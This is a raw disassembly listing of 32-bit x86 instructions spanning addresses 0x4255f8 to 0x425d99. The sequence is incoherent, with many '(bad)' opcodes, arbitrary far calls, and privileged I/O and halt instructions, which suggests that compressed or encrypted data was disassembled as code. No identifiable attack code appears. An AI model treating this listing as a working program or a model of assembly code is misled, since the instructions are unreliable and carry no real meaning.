  4255f8:	mov    dl,BYTE PTR [edi+0x45629fc3]
  4255fe:	je     0x425661
  425600:	xchg   edx,eax
  425601:	repz push 0x27198410
  425607:	arpl   sp,bx
  425609:	or     bl,dl
  42560b:	cli    
  42560c:	jno    0x425601
  42560e:	fcmove st,st(5)
  425610:	sub    BYTE PTR [ebx-0x58e182a3],0xda
  425617:	xchg   ebx,eax
  425618:	ss cdq 
  42561a:	call   0xa83:0x5add3f99
  425621:	fwait
  425622:	xor    BYTE PTR [eax],0x78
  425625:	add    BYTE PTR [ebx],0x1d
  425628:	out    0x80,eax
  42562a:	or     ebp,ebp
  42562c:	jge    0x42567a
  42562e:	inc    ebp
  42562f:	popf   
  425630:	xchg   edx,eax
  425631:	cmp    BYTE PTR [ecx],ch
  425633:	push   0x94e427f3
  425638:	imul   ebp,DWORD PTR [ebx+0x2875fc16],0x50686073
  425642:	xchg   edi,eax
  425643:	cmp    al,0x4
  425645:	pusha  
  425646:	icebp  
  425647:	sbb    esi,DWORD PTR [ebp-0x22144f56]
  42564d:	xor    BYTE PTR [ebx+0x35],cl
  425650:	and    eax,0x6d37d04a
  425655:	dec    eax
  425656:	push   ss
  425657:	pop    esi
  425658:	call   0xf1a7:0x2b6ca70e
  42565f:	ins    BYTE PTR es:[edi],dx
  425660:	sti    
  425661:	loope  0x425640
  425663:	add    ecx,DWORD PTR [edi+ebp*2]
  425666:	adc    ebx,DWORD PTR [ebp+edi*8+0x7e]
  42566a:	xor    DWORD PTR [eax+0x71],eax
  42566d:	inc    esp
  42566e:	dec    edi
  42566f:	mov    es,WORD PTR [edx-0x11]
  425672:	gs jmp 0xa8283ebe
  425678:	sti    
  425679:	inc    edi
  42567a:	ins    BYTE PTR es:[edi],dx
  42567b:	add    al,0xfb
  42567d:	out    dx,eax
  42567e:	cmp    edx,edi
  425680:	arpl   WORD PTR [ecx+0x43c3e6a6],ax
  425686:	push   eax
  425687:	lods   al,BYTE PTR ds:[esi]
  425688:	or     BYTE PTR [ebp-0x3a],0x8e
  42568c:	lock ret 0x9b22
  425690:	inc    ebp
  425691:	daa    
  425692:	and    DWORD PTR [esi+ebx*2+0x23],eax
  425696:	retf   
  425697:	or     al,0x7c
  425699:	mov    dl,0xbb
  42569b:	mov    esp,0xc44c2f8
  4256a0:	call   0xad684c27
  4256a5:	and    BYTE PTR [ebx-0x6a],ch
  4256a8:	mov    eax,0x28d8fac4
  4256ad:	xor    ebp,ebp
  4256af:	add    ebx,ecx
  4256b1:	and    DWORD PTR [ecx+eiz*8-0x6b],esp
  4256b5:	mov    ebp,0xf9eaad9
  4256ba:	jl     0x4256c2
  4256bc:	cmp    BYTE PTR [edx+edi*4-0x46bc3329],ch
  4256c3:	aaa    
  4256c4:	xor    bl,bl
  4256c6:	and    cl,BYTE PTR [esi+0x29]
  4256c9:	mov    ds:0x6232db68,eax
  4256ce:	adc    BYTE PTR [ebp-0x34],0xc2
  4256d2:	(bad)  
  4256d4:	xchg   BYTE PTR [ebx],dh
  4256d6:	(bad)  
  4256d7:	fistp  WORD PTR [bx+di-0x5e]
  4256db:	dec    esp
  4256dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256dd:	jecxz  0x4256d0
  4256df:	test   BYTE PTR [ebx+0x13],cl
  4256e2:	add    BYTE PTR [edi-0x48],cl
  4256e5:	popf   
  4256e6:	or     BYTE PTR [esp+ebx*8],dl
  4256e9:	and    cl,bh
  4256eb:	imul   edx,ebp,0xffffffcc
  4256ee:	std    
  4256ef:	inc    esp
  4256f0:	test   eax,0xc5d262d5
  4256f5:	lea    edx,[edx+0xe]
  4256f8:	push   ecx
  4256f9:	dec    eax
  4256fa:	push   0xffffffb1
  4256fc:	and    al,0x1a
  4256fe:	inc    edi
  4256ff:	inc    ecx
  425700:	retf   0xacdf
  425703:	xchg   esi,eax
  425704:	ror    BYTE PTR [ebx+0x23d2d210],cl
  42570a:	xor    al,0x5b
  42570c:	push   ss
  42570d:	jne    0x4256fe
  42570f:	and    eax,DWORD PTR [edx+ebx*8-0x9412fa5]
  425716:	aaa    
  425717:	out    dx,eax
  425718:	jg     0x425743
  42571a:	iret   
  42571b:	xchg   esi,eax
  42571c:	pop    ss
  42571d:	ds in  eax,dx
  42571f:	je     0x425766
  425721:	scas   eax,DWORD PTR es:[edi]
  425722:	jp     0x24c132b4
  425728:	jmp    0x6a39a351
  42572d:	inc    edi
  42572e:	clc    
  42572f:	and    eax,0x78380c41
  425734:	dec    eax
  425735:	daa    
  425736:	jns    0x425720
  425738:	loop   0x425703
  42573a:	mov    eax,0x9e066ee0
  42573f:	xor    eax,0x8d8e5297
  425744:	or     cl,BYTE PTR [ebx-0x2091a5a]
  42574a:	nop
  42574b:	hlt    
  42574c:	aam    0x9
  42574e:	ds imul eax,esp,0x8477ac2b
  425755:	add    al,BYTE PTR [ecx+0x47]
  425758:	mov    eax,ds:0x566fe8cc
  42575d:	data16 cld 
  42575f:	test   al,0x7f
  425761:	sbb    al,0x5e
  425763:	mov    eax,ds:0x326f655
  425768:	push   esp
  425769:	xor    ah,al
  42576b:	(bad)  
  42576d:	std    
  42576e:	sbb    al,0xb4
  425770:	leave  
  425771:	xchg   DWORD PTR [edx+ebx*1-0x4de1e45e],ebp
  425778:	int    0x5e
  42577a:	sti    
  42577b:	pop    edx
  42577c:	mov    bh,0xd4
  42577e:	xchg   DWORD PTR [ecx],ecx
  425780:	dec    eax
  425781:	push   esi
  425782:	push   ebp
  425783:	or     al,0xb0
  425785:	jle    0x425778
  425787:	mov    eax,0x20eb025a
  42578c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42578d:	loop   0x4257de
  42578f:	or     dl,BYTE PTR fs:[eax+0x31]
  425793:	ss int 0x4e
  425796:	lahf   
  425797:	enter  0xa2d,0x2d
  42579b:	add    DWORD PTR [ecx],esi
  42579d:	outs   dx,BYTE PTR ds:[esi]
  42579e:	pop    edi
  42579f:	pop    ds
  4257a0:	int3   
  4257a1:	xor    BYTE PTR [edx+0x1f],dl
  4257a4:	add    al,0xd1
  4257a6:	push   ebp
  4257a7:	inc    eax
  4257a8:	aas    
  4257a9:	dec    ebp
  4257aa:	sbb    BYTE PTR [ebp-0x2c9d2888],ah
  4257b0:	popa   
  4257b1:	jno    0x425804
  4257b3:	cli    
  4257b4:	pop    ebp
  4257b5:	js     0x4257b9
  4257b7:	jp     0x42582f
  4257b9:	popf   
  4257ba:	ins    DWORD PTR es:[edi],dx
  4257bb:	ja     0x42580c
  4257bd:	inc    ebx
  4257be:	popf   
  4257bf:	jnp    0x4257b1
  4257c1:	or     edx,DWORD PTR [edi+edi*4-0x4b184a58]
  4257c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257c9:	sahf   
  4257ca:	push   edx
  4257cb:	ss sbb ecx,edx
  4257ce:	sbb    ah,bl
  4257d0:	cwde   
  4257d1:	jae    0x4257fc
  4257d3:	pop    esp
  4257d4:	call   0x6d23f10e
  4257d9:	jle    0x425825
  4257db:	inc    esi
  4257dc:	stos   BYTE PTR es:[edi],al
  4257dd:	jo     0x425765
  4257df:	in     eax,dx
  4257e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257e1:	xor    ecx,DWORD PTR [edi-0x6668e12b]
  4257e7:	lods   al,BYTE PTR ds:[esi]
  4257e8:	adc    DWORD PTR [ebp-0x69],0xffffffb9
  4257ec:	mov    eax,DWORD PTR [ecx-0x2524a2bc]
  4257f2:	push   ebp
  4257f3:	paddq  mm6,QWORD PTR [edx-0x6249b596]
  4257fa:	stos   DWORD PTR es:[edi],eax
  4257fb:	jo     0x4257e4
  4257fd:	inc    edx
  4257fe:	mov    eax,ss
  425800:	hlt    
  425801:	jnp    0x42581d
  425803:	(bad)  
  425804:	fucomp st(5)
  425806:	mov    ecx,0x41a1e9ea
  42580b:	sub    al,0x1
  42580d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42580e:	mov    edx,DWORD PTR [ebp+0x17339feb]
  425814:	cdq    
  425815:	cmp    al,bl
  425817:	popa   
  425818:	jmp    0x2647:0x7de11ddf
  42581f:	or     BYTE PTR [ecx],dh
  425821:	outs   dx,DWORD PTR ds:[esi]
  425822:	ret    0x7b04
  425825:	ins    DWORD PTR es:[edi],dx
  425826:	mov    dh,0x18
  425828:	jmp    0x4257aa
  42582a:	jecxz  0x4257f7
  42582c:	push   esi
  42582d:	push   ss
  42582e:	lock push cs
  425830:	test   ch,bl
  425832:	pop    ebp
  425833:	xchg   ebp,eax
  425834:	xor    BYTE PTR [esp+edi*1],cl
  425837:	sti    
  425838:	shl    edi,cl
  42583a:	sub    dl,al
  42583c:	leave  
  42583d:	rcl    BYTE PTR [ebx-0x64],cl
  425840:	gs retf 0xfc58
  425844:	add    edi,DWORD PTR [esp+edi*2+0x15e3893c]
  42584b:	test   DWORD PTR [esi-0x249950f5],eax
  425851:	sbb    dh,bh
  425853:	inc    ecx
  425854:	js     0x42582f
  425856:	mov    ebp,0xc5e939c5
  42585b:	mov    dh,BYTE PTR [ecx]
  42585d:	ret    
  42585e:	loopne 0x425880
  425860:	mov    eax,ds:0x4d10cfb6
  425865:	cmp    bl,dl
  425867:	(bad)  
  425868:	out    dx,al
  425869:	inc    esp
  42586a:	xor    DWORD PTR [eax+ebp*4-0x5895b40d],ebp
  425871:	jbe    0x425886
  425873:	mov    eax,0x49c8a562
  425878:	loop   0x425812
  42587a:	mov    cl,0x80
  42587c:	lock les ebx,FWORD PTR [edx]
  42587f:	sbb    esp,DWORD PTR [edi]
  425881:	mov    ds:0xf3e08014,eax
  425886:	dec    ebp
  425887:	fscale 
  425889:	(bad)  
  42588a:	mov    esp,0x1d926977
  42588f:	es pop esp
  425891:	test   eax,0xb15bc7b4
  425896:	adc    DWORD PTR [edi-0x491edc2b],0xac932c84
  4258a0:	mov    eax,esp
  4258a2:	push   edi
  4258a3:	scas   eax,DWORD PTR es:[edi]
  4258a4:	mov    ds:0x74dcfcf9,eax
  4258a9:	adc    al,0xd1
  4258ab:	jle    0x425897
  4258ad:	mov    ecx,0x40b7eb09
  4258b2:	dec    edx
  4258b3:	dec    edx
  4258b4:	retf   
  4258b5:	dec    ebp
  4258b6:	mov    edx,DWORD PTR [ebx]
  4258b8:	cdq    
  4258b9:	add    BYTE PTR ds:0xc167bc3f,ah
  4258bf:	adc    cl,BYTE PTR [ebp+ecx*8-0xb]
  4258c3:	jle    0x4258d5
  4258c5:	stos   DWORD PTR es:[edi],eax
  4258c6:	fsub   QWORD PTR [ebx-0x2d]
  4258c9:	das    
  4258ca:	push   0x9aea86e7
  4258cf:	pop    edx
  4258d0:	dec    esp
  4258d1:	in     al,dx
  4258d2:	and    ebp,DWORD PTR [ebp+0x5f1bef7a]
  4258d8:	xchg   DWORD PTR [ecx+ecx*8],ecx
  4258db:	jno    0x42589f
  4258dd:	jb     0x425868
  4258df:	in     eax,dx
  4258e0:	outs   dx,BYTE PTR ds:[esi]
  4258e1:	pop    ds
  4258e2:	in     eax,dx
  4258e3:	scas   eax,DWORD PTR es:[edi]
  4258e4:	cmp    DWORD PTR [ebx],esp
  4258e6:	and    edi,DWORD PTR ds:[edx]
  4258e9:	aad    0x0
  4258eb:	out    0x1f,eax
  4258ed:	sbb    DWORD PTR [edi],ebx
  4258ef:	dec    edx
  4258f0:	(bad)  
  4258f1:	imul   ecx,DWORD PTR [ebx-0x43],0xb9ecc1c5
  4258f8:	test   BYTE PTR [edi-0x57],ah
  4258fb:	xchg   edi,eax
  4258fc:	ins    DWORD PTR es:[edi],dx
  4258fd:	mov    edi,0xf5795984
  425902:	mov    cl,0x55
  425904:	lds    ebp,FWORD PTR [eax-0xdae6d5c]
  42590a:	mov    al,0x4f
  42590c:	mov    edx,0xf5d1af83
  425911:	stos   DWORD PTR es:[edi],eax
  425912:	xor    BYTE PTR [ebx+0x34e62090],bh
  425918:	add    al,0x46
  42591a:	cdq    
  42591b:	in     eax,0x2f
  42591d:	shl    BYTE PTR [ebx+0x66],1
  425920:	cs je  0x425900
  425923:	shl    BYTE PTR [eax+0x6e],1
  425926:	in     al,0x89
  425928:	or     ah,BYTE PTR [ebx-0x67074f9d]
  42592e:	pop    ebp
  42592f:	fcomp  DWORD PTR [eax+eax*1]
  425932:	adc    ebx,ecx
	...
  425940:	add    ah,ch
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx-0x652744fe],ah
  425951:	and    al,dl
  425953:	add    DWORD PTR [eax],eax
  425955:	stos   DWORD PTR es:[edi],eax
  425956:	add    eax,DWORD PTR [eax]
  425958:	add    BYTE PTR [edi],bh
  42595a:	add    DWORD PTR [edx+0x72c760e],0xe3745ec3
  425964:	cmp    bh,BYTE PTR [ebx-0x44]
  425967:	daa    
  425968:	popf   
  425969:	pop    esp
  42596a:	scas   eax,DWORD PTR es:[edi]
  42596b:	out    0x83,eax
  42596d:	adc    bh,BYTE PTR ss:[edx-0x4c]
  425971:	mov    es,WORD PTR [eax+0x1]
  425974:	rol    BYTE PTR [eax],cl
  425976:	pop    ss
  425977:	sub    esp,DWORD PTR [esi+0xd]
  42597a:	sub    esp,DWORD PTR ds:0x665cba6d
  425980:	enter  0x2e2a,0x1d
  425984:	xchg   ebp,eax
  425985:	enter  0xea5b,0xe
  425989:	mov    edx,0xfe49be4d
  42598e:	mov    dl,0x45
  425990:	pop    edi
  425991:	cmp    BYTE PTR [ebp+eiz*1-0x2d946e48],al
  425998:	sti    
  425999:	push   esp
  42599a:	jle    0x4259b4
  42599c:	xor    bl,al
  42599e:	mov    dl,0xe2
  4259a0:	popa   
  4259a1:	scas   eax,DWORD PTR es:[edi]
  4259a2:	xchg   ebx,eax
  4259a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259a4:	cmp    al,0x63
  4259a6:	rcl    DWORD PTR [ecx+0x5],1
  4259a9:	std    
  4259aa:	lahf   
  4259ab:	add    BYTE PTR [edi],al
  4259ad:	adc    al,0xb2
  4259af:	ror    BYTE PTR [ecx],cl
  4259b1:	aas    
  4259b2:	in     eax,0x15
  4259b4:	fist   DWORD PTR [eax-0x6]
  4259b7:	mov    ebx,0xcd2ee596
  4259bc:	push   esi
  4259bd:	jnp    0x425a12
  4259bf:	rcl    BYTE PTR [ecx],1
  4259c1:	xchg   ebp,eax
  4259c2:	test   dl,dl
  4259c4:	fiadd  WORD PTR [eax-0x2d56fe6a]
  4259ca:	jo     0x425973
  4259cc:	push   ecx
  4259cd:	aaa    
  4259ce:	pop    esi
  4259cf:	jno    0x425996
  4259d1:	pop    ebp
  4259d2:	js     0x4259b3
  4259d4:	xchg   ebp,eax
  4259d5:	test   BYTE PTR [edi+0x4d6d3675],al
  4259db:	push   0xfbeeacd7
  4259e0:	jge    0x4259ed
  4259e2:	pop    edx
  4259e3:	fcom   QWORD PTR [eax+edi*1+0x510dd4dc]
  4259ea:	sbb    DWORD PTR [esi],edx
  4259ec:	and    eax,0x33f031b2
  4259f1:	sub    al,0x7c
  4259f3:	lea    edx,[eax-0x10]
  4259f6:	in     eax,0xb5
  4259f8:	pop    ss
  4259f9:	popa   
  4259fa:	inc    esp
  4259fb:	sub    al,0x24
  4259fd:	mov    dh,0xc6
  4259ff:	lea    esp,[edi-0x43]
  425a02:	test   BYTE PTR [eax],bl
  425a04:	adc    DWORD PTR [esi-0x69],ebx
  425a07:	stc    
  425a08:	retf   
  425a09:	jae    0x425998
  425a0b:	arpl   cx,si
  425a0d:	cmp    DWORD PTR ds:0x6f16444e,ecx
  425a13:	sub    esp,DWORD PTR [esi+0x5f]
  425a16:	xlat   BYTE PTR ds:[ebx]
  425a17:	ss xchg esi,eax
  425a19:	or     DWORD PTR [ecx-0x52ae7a79],0x5d
  425a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a21:	sbb    al,0x47
  425a23:	push   edi
  425a24:	sub    al,0x16
  425a26:	fwait
  425a27:	sbb    ch,BYTE PTR [eax]
  425a29:	lds    ebx,FWORD PTR [ecx+0x3af95834]
  425a2f:	mov    DWORD PTR [eax-0x3d],edx
  425a32:	outs   dx,DWORD PTR ds:[esi]
  425a33:	and    esp,DWORD PTR [ebp+0x6e]
  425a36:	dec    esp
  425a37:	xor    eax,0x8681a236
  425a3c:	cld    
  425a3d:	xchg   esp,edx
  425a3f:	imul   eax
  425a41:	dec    ecx
  425a42:	lds    ebx,FWORD PTR [ebp+0x44ea9eae]
  425a48:	dec    eax
  425a49:	(bad)  
  425a4a:	(bad)  
  425a4b:	mov    esi,0xc3e1ebc6
  425a50:	test   eax,0xe83f3a4c
  425a55:	xor    ch,BYTE PTR [ebx+esi*1-0x60d3a837]
  425a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a5d:	sbb    eax,DWORD PTR [eax]
  425a5f:	in     eax,0x50
  425a61:	mov    edi,0xca7acd82
  425a66:	sub    eax,0x368fdf70
  425a6b:	jp     0x4259f0
  425a6d:	fs out dx,eax
  425a6f:	push   esi
  425a70:	scas   al,BYTE PTR es:[edi]
  425a71:	daa    
  425a72:	pop    ebx
  425a73:	(bad)  
  425a74:	fmul   QWORD PTR [esi]
  425a76:	sbb    eax,0x85843c8
  425a7b:	dec    edi
  425a7c:	loop   0x425afc
  425a7e:	sub    eax,0xa7243782
  425a83:	in     eax,0xa4
  425a85:	xor    dl,dh
  425a87:	adc    ah,BYTE PTR [ecx-0x46663b5d]
  425a8d:	test   eax,0x53447b51
  425a92:	sub    DWORD PTR [edi+0x4d],edi
  425a95:	dec    ebx
  425a96:	mov    al,ds:0xdc20ede5
  425a9b:	mov    ah,BYTE PTR [edx-0x74ac7325]
  425aa1:	dec    esi
  425aa2:	mov    bl,0x40
  425aa4:	ins    BYTE PTR es:[edi],dx
  425aa5:	stos   BYTE PTR es:[edi],al
  425aa6:	scas   al,BYTE PTR es:[edi]
  425aa7:	sbb    dl,ah
  425aa9:	or     al,ch
  425aab:	in     al,0x63
  425aad:	enter  0xc7fb,0x13
  425ab1:	sbb    BYTE PTR [ecx+0x53],bh
  425ab4:	enter  0x9ac1,0x84
  425ab8:	into   
  425ab9:	sbb    edx,DWORD PTR [edi-0x5f]
  425abc:	arpl   WORD PTR [eax+0x54],bp
  425abf:	jp     0x425b3c
  425ac1:	loop   0x425ac9
  425ac3:	clc    
  425ac4:	pusha  
  425ac5:	sbb    ah,0xbf
  425ac8:	xchg   esp,eax
  425ac9:	or     BYTE PTR [ebp+0x52],ch
  425acc:	dec    edx
  425acd:	push   ss
  425ace:	icebp  
  425acf:	inc    esi
  425ad0:	dec    eax
  425ad1:	repz aam 0xec
  425ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ad5:	or     cl,dl
  425ad7:	lds    esp,FWORD PTR [ecx]
  425ad9:	cmc    
  425ada:	rcr    DWORD PTR [eax],0x91
  425add:	sub    al,0xe
  425adf:	push   0x9cb42067
  425ae4:	fsub   DWORD PTR [ebx+eiz*2+0xbb62279]
  425aeb:	adc    esi,DWORD PTR [esi+0x5cc9ae2b]
  425af1:	shl    BYTE PTR [ebx-0x4c],cl
  425af4:	mov    dh,0xc5
  425af6:	mov    al,0x74
  425af8:	cmc    
  425af9:	dec    ebx
  425afa:	xchg   edx,eax
  425afb:	leavew 
  425afd:	fld    DWORD PTR [ebx-0x3a]
  425b00:	adc    eax,0xa03c8026
  425b05:	mov    ch,0x23
  425b07:	dec    esp
  425b08:	jecxz  0x425b26
  425b0a:	adc    cl,BYTE PTR [edx+eiz*2-0x506425eb]
  425b11:	(bad)  
  425b12:	scas   al,BYTE PTR es:[edi]
  425b13:	lea    eax,[edi-0x6fbf8c16]
  425b19:	push   0x553f19e3
  425b1e:	es hlt 
  425b20:	pop    ecx
  425b21:	retf   
  425b22:	mov    cl,0xa4
  425b24:	iret   
  425b25:	mov    eax,0x92a58423
  425b2a:	jmp    0x43ee0c84
  425b2f:	repnz sub BYTE PTR [edx-0x4c],ch
  425b33:	xor    al,0xea
  425b35:	je     0x425ada
  425b37:	sub    eax,edx
  425b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b3a:	mov    ecx,0xd4951c8
  425b3f:	xchg   BYTE PTR [edi+0x2d],cl
  425b42:	mov    cl,BYTE PTR [esi+0x46]
  425b45:	jle    0x425bc0
  425b47:	fldcw  WORD PTR [eax+ebx*8-0x34]
  425b4b:	call   0x99f7:0x15114900
  425b52:	lods   al,BYTE PTR ds:[esi]
  425b53:	int    0xf6
  425b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b56:	inc    ebp
  425b57:	mul    BYTE PTR [ecx+edx*2]
  425b5a:	rcl    ecx,1
  425b5c:	nop
  425b5d:	stc    
  425b5e:	mov    ebx,DWORD PTR [ebx]
  425b60:	inc    eax
  425b61:	adc    eax,DWORD PTR [edi-0x6de39394]
  425b67:	arpl   WORD PTR [edx+edx*8+0x45],cx
  425b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b6c:	das    
  425b6d:	pop    ecx
  425b6e:	stos   DWORD PTR es:[edi],eax
  425b6f:	daa    
  425b70:	jge    0x425bc6
  425b72:	gs cld 
  425b74:	pushf  
  425b75:	js     0x425be6
  425b77:	imul   edi,DWORD PTR [esi-0x2c],0xbc3deedd
  425b7e:	push   es
  425b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b80:	dec    edx
  425b81:	repz adc BYTE PTR [eax+0x3975012c],bl
  425b88:	or     BYTE PTR [edi-0x4],dl
  425b8b:	sbb    al,0xb7
  425b8d:	pushf  
  425b8e:	mov    dl,0x8f
  425b90:	dec    esp
  425b91:	pop    es
  425b92:	pop    esi
  425b93:	sbb    eax,0x53b732
  425b98:	adc    ebp,DWORD PTR [ebx-0x619187a9]
  425b9e:	mov    ebx,0xd724eb19
  425ba3:	xor    DWORD PTR [eax+0x6b439527],0x97fc2100
  425bad:	mov    edi,0x590dddba
  425bb2:	bswap  ecx
  425bb4:	and    DWORD PTR [edx-0x193202d8],0xffffffb4
  425bbb:	sbb    ch,BYTE PTR [eax]
  425bbd:	push   edi
  425bbe:	test   DWORD PTR [edi-0x7e],ecx
  425bc1:	test   BYTE PTR [edi+0x18],dl
  425bc4:	in     al,0x8e
  425bc6:	out    0x35,al
  425bc8:	push   edx
  425bc9:	pop    edx
  425bca:	hlt    
  425bcb:	(bad)  
  425bcc:	fcom   QWORD PTR [esp+edx*4]
  425bcf:	test   DWORD PTR ss:[eax-0x91fa091],ecx
  425bd6:	pop    es
  425bd7:	xor    ah,BYTE PTR [ebx+0x3e]
  425bda:	mov    edx,0x85a4e36f
  425bdf:	adc    DWORD PTR [edx-0x32bcda6],ebx
  425be5:	dec    edi
  425be6:	inc    ebx
  425be7:	test   al,0x39
  425be9:	call   0x43cd:0x8aaebc4a
  425bf0:	fdivr  DWORD PTR [ecx-0x44]
  425bf3:	ins    BYTE PTR es:[edi],dx
  425bf4:	xchg   DWORD PTR [edx-0x1bd3ed67],edx
  425bfa:	imul   edi,ecx,0x49
  425bfd:	aam    0x81
  425bff:	call   0xd179:0xf90736e4
  425c06:	ret    
  425c07:	jl     0x425c78
  425c09:	push   0x547e3db1
  425c0e:	xchg   edi,eax
  425c0f:	add    BYTE PTR [eax],bh
  425c11:	shl    BYTE PTR [eax],cl
  425c13:	cwde   
  425c14:	jmp    0x425c50
  425c16:	sti    
  425c17:	dec    edi
  425c18:	fldz   
  425c1a:	mul    BYTE PTR [ecx]
  425c1c:	aas    
  425c1d:	add    BYTE PTR [edi+0xbd13089],dl
  425c23:	mov    ah,0xe6
  425c25:	pop    esp
  425c26:	test   DWORD PTR [edi+edx*1],edx
  425c29:	in     al,dx
  425c2a:	sbb    DWORD PTR [ebx-0x62],esi
  425c2d:	test   al,0xab
  425c2f:	fcomp  st(1)
  425c31:	bound  esi,QWORD PTR [edx]
  425c33:	jmp    0x5e0f:0xfe36e061
  425c3a:	in     al,dx
  425c3b:	imul   ebx,DWORD PTR [ecx-0x5fee4933],0xc29983d5
  425c45:	lods   eax,DWORD PTR ds:[esi]
  425c46:	pop    ds
  425c47:	in     al,dx
  425c48:	adc    al,0x46
  425c4a:	fst    DWORD PTR [edi+0x5c]
  425c4d:	lea    ecx,[ebx-0x41]
  425c50:	ss mov dh,0xeb
  425c53:	test   eax,0xdee91472
  425c58:	jle    0x425c54
  425c5a:	inc    ebx
  425c5b:	add    al,0x3
  425c5d:	ja     0x425cad
  425c5f:	cmp    bh,al
  425c61:	loopne 0x425c9f
  425c63:	xchg   edi,eax
  425c64:	and    dl,bl
  425c66:	jecxz  0x425c7b
  425c68:	mov    dl,0xfc
  425c6a:	inc    eax
  425c6b:	dec    esi
  425c6c:	sub    ah,BYTE PTR [edi+0x4c]
  425c6f:	sti    
  425c70:	add    esp,DWORD PTR [edi+0x7141bbf4]
  425c76:	push   ebx
  425c77:	sub    eax,0x348212d7
  425c7c:	xchg   edx,eax
  425c7d:	mov    esp,0x96cfcaa2
  425c82:	xchg   BYTE PTR [ebp-0x65566403],bl
  425c88:	fstp   QWORD PTR [ebx]
  425c8a:	push   cs
  425c8b:	aaa    
  425c8c:	repz clc 
  425c8e:	mov    cl,0x1
  425c90:	push   ebp
  425c91:	push   cs
  425c92:	pop    ebp
  425c93:	sbb    ebp,ecx
  425c95:	imul   edi,DWORD PTR [ecx],0xffffffe7
  425c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c99:	jmp    0x374b:0xff2206f2
  425ca0:	(bad)  
  425ca1:	daa    
  425ca2:	(bad)  
  425ca3:	xchg   edx,eax
  425ca4:	pop    esi
  425ca5:	aas    
  425ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ca7:	mov    eax,ds:0xe1f50b8
  425cac:	aas    
  425cad:	xor    DWORD PTR [esi],eax
  425caf:	xor    ah,BYTE PTR [esp+eiz*2]
  425cb2:	inc    ebp
  425cb3:	pop    ds
  425cb4:	push   0x48
  425cb6:	ins    DWORD PTR es:[edi],dx
  425cb7:	adc    esi,DWORD PTR [edi+edi*8]
  425cba:	mov    bl,0x58
  425cbc:	cmp    bl,dh
  425cbe:	inc    ebx
  425cbf:	cmp    cl,bh
  425cc1:	add    ebx,DWORD PTR [ebx-0x7dc422d5]
  425cc7:	add    al,0x1d
  425cc9:	jecxz  0x425cd7
  425ccb:	sbb    BYTE PTR [esp+eax*4-0xeb17d54],bh
  425cd2:	ins    BYTE PTR es:[edi],dx
  425cd3:	mov    ds:0xd2b975a1,al
  425cd8:	out    dx,al
  425cd9:	rcl    BYTE PTR [eax],cl
  425cdb:	or     eax,0x151493fe
  425ce0:	push   0xffffff8d
  425ce2:	mov    ?,WORD PTR es:[edx]
  425ce5:	lock aad 0x5f
  425ce8:	mov    al,0x74
  425cea:	outs   dx,DWORD PTR ds:[esi]
  425ceb:	xor    eax,0xac8fc4c0
  425cf0:	xor    esp,DWORD PTR [edi-0x1e78ef44]
  425cf6:	(bad)  [edx+0x1d]
  425cf9:	and    al,0x11
  425cfb:	and    al,0x3f
  425cfd:	adc    edi,DWORD PTR [ebx]
  425cff:	stc    
  425d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d01:	mov    ds:0x55e2,eax
	...
  425d0e:	add    BYTE PTR [eax],al
  425d10:	add    BYTE PTR [edx+0x51],bl
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock repnz loope 0x425cf1
  425d20:	repnz retf 
  425d22:	rol    DWORD PTR [ecx],cl
  425d24:	add    BYTE PTR [ebx-0x13fffffd],ch
  425d2a:	and    al,0x6b
  425d2c:	or     al,0xd5
  425d2e:	adc    eax,0x98795955
  425d33:	jb     0x425cbb
  425d35:	retf   
  425d36:	dec    edx
  425d37:	pop    esi
  425d38:	pop    ds
  425d39:	stc    
  425d3a:	xor    eax,DWORD PTR [edi+0x2bf4131a]
  425d40:	xlat   BYTE PTR ds:[ebx]
  425d41:	mov    bh,0xef
  425d43:	xchg   ebx,eax
  425d44:	mov    edi,0xeb62726e
  425d49:	pop    esi
  425d4a:	ss es in al,dx
  425d4d:	lahf   
  425d4e:	mov    ds:0x69ab18cf,eax
  425d53:	jmp    0x425d5d
  425d55:	mov    WORD PTR [ebp+0x6b],ds
  425d58:	mov    ss,WORD PTR [ebp+ebx*4-0x7c]
  425d5c:	cmp    al,0xea
  425d5e:	jge    0x425db9
  425d60:	stos   BYTE PTR es:[edi],al
  425d61:	in     al,dx
  425d62:	in     al,0x95
  425d64:	inc    ebx
  425d65:	lods   eax,DWORD PTR ds:[esi]
  425d66:	stos   DWORD PTR es:[edi],eax
  425d67:	nop
  425d68:	mov    cl,0xfa
  425d6a:	mov    ?,WORD PTR [edx+0x73]
  425d6d:	lods   al,BYTE PTR ds:[esi]
  425d6e:	scas   al,BYTE PTR es:[edi]
  425d6f:	lds    ecx,FWORD PTR [ebx+eax*1+0x489336ac]
  425d76:	repz pop edx
  425d78:	jmp    0x37929602
  425d7d:	retf   
  425d7e:	ins    BYTE PTR es:[edi],dx
  425d7f:	aad    0xfc
  425d81:	dec    esp
  425d82:	jae    0x425d45
  425d84:	push   0x8933df14
  425d89:	daa    
  425d8a:	inc    ebp
  425d8b:	push   esp
  425d8c:	out    dx,al
  425d8d:	and    ecx,esi
  425d8f:	dec    edx
  425d90:	sbb    ah,bh
  425d92:	sbb    cl,BYTE PTR ds:0x8912c1ef
  425d98:	dec    eax
  425d99:	out    dx,eax
